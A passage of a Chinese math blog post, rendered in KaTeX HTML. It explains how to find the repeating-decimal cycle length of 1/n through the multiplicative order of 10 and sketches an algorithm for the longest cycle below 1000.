class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，那么<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>n</mi></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>m</mi></mrow><annotation encoding="application/x-tex">a^n \equiv 1 \mod m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span></span></span></span>也成立。</p><p>为了找到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">n_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，我们需要找到最小的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>，使得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>n</mi></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">a^n \equiv 1 \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span>且<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>n</mi></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">a^n \equiv 1 \mod q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>。这意味着<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>必须同时是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">n_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">n_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>的倍数。因此，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>m</mi></msub><mo>=</mo><mtext>lcm</mtext><mo stretchy="false">(</mo><msub><mi>n</mi><mi>p</mi></msub><mo separator="true">,</mo><msub><mi>n</mi><mi>q</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n_m = \text{lcm}(n_p, n_q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord text"><span class="mord">lcm</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。</p><p>那就到了另外一个问题了，如何快速求得 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><msup><mi>p</mi><mi>b</mi></msup></mrow><annotation encoding="application/x-tex">10^k \mod p^b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span></span></span></span> 的阶？我们只知道阶一定是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mi>b</mi></msup><mo stretchy="false">)</mo><mo>=</mo><msup><mi>p</mi><mrow><mi>b</mi><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(p^b)=p^{b-1}(p-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> 的因子。</p><h2 id="分母和-10-不互质的时候">分母和 10 不互质的时候</h2><p>当 10 和 n 不互质的时候，n 的因数包含 2 或者 5，设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><msup><mn>2</mn><mi>a</mi></msup><mo>∗</mo><msup><mn>5</mn><mi>b</mi></msup><mo>∗</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">n=2^a*5^b*m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>，m 与 10 互质，a,b 是自然数且不全为 0。此时</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mi>k</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mo stretchy="false">(</mo><msup><mn>2</mn><mi>a</mi></msup><msup><mn>5</mn><mi>b</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">10^k \mod (2^a5^b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8991em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1.1491em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>当 k 足够大时，必然为 0。我们只需要证明，<strong>有限小数乘以无限循环小数，不会改变循环节长度</strong>。这个需要证明，但是我不会。</p><p>也就是不必管 2 或者 5 作为因子的情况，提取出与 10 互质的因子即可。（证明我还不会）。</p><h2 id="算法">算法</h2><p>首先除净 2 和 5，值一定是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mi>a</mi></msup><msup><mi>q</mi><mi>b</mi></msup></mrow><annotation encoding="application/x-tex">p^aq^b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span></span></span></span>这样结构组合（部分指数可以为 0），此时<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mi>b</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(p^b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 小于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mi>b</mi></msup></mrow><annotation encoding="application/x-tex">p^b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span></span></span></span>，那么计算最小公倍数，肯定小于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mi>a</mi></msup><msup><mi>q</mi><mi>b</mi></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">p^a q^b-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>。也就是说，对于质数 p，它的阶必然大于任何比他小的数的阶。所以只要找到 1000 以内最大的质数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></msub></mrow><annotation encoding="application/x-tex">p_{max}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ma</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，并且和直到 1000，除净之后且比<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></msub></mrow><annotation encoding="application/x-tex">p_{max}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ma</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>大的数比较即可。</p><p>这又涉及到问题**相邻两个质数 p, q 之间的数，除以 2 之后，可能比 p 大吗？**这实际上等价于是否存在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>&lt;</mo><mi>x</mi><mo>&lt;</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">p&lt;x&lt;q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>使得 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mi>p</mi><mo>&lt;</mo><mi>x</mi><mo>&lt;</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">2p&lt;x&lt;q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">2</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>。这我不知道，但是在 1000 以内是不可能的。</p><p>那么对于**两个相邻质数 p,q 之间，存在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><msubsup><mi>p</mi><mn>1</mn><msub><mi>a</mi><mn>1</mn></msub></msubsup><msubsup><mi>p</mi><mn>2</mn><msub><mi>a</mi><mn>2</mn></msub></msubsup><mo>⋯</mo><msubsup><mi>p</mi><mi>m</mi><msub><mi>a</mi><mi>m</mi></msub></msubsup></mrow><annotation encoding="application/x-tex">x=p_{1}^{a_1}p_{2}^{a_2}\cdots p_{m}^{a_m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.2663em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7463em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7463em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span 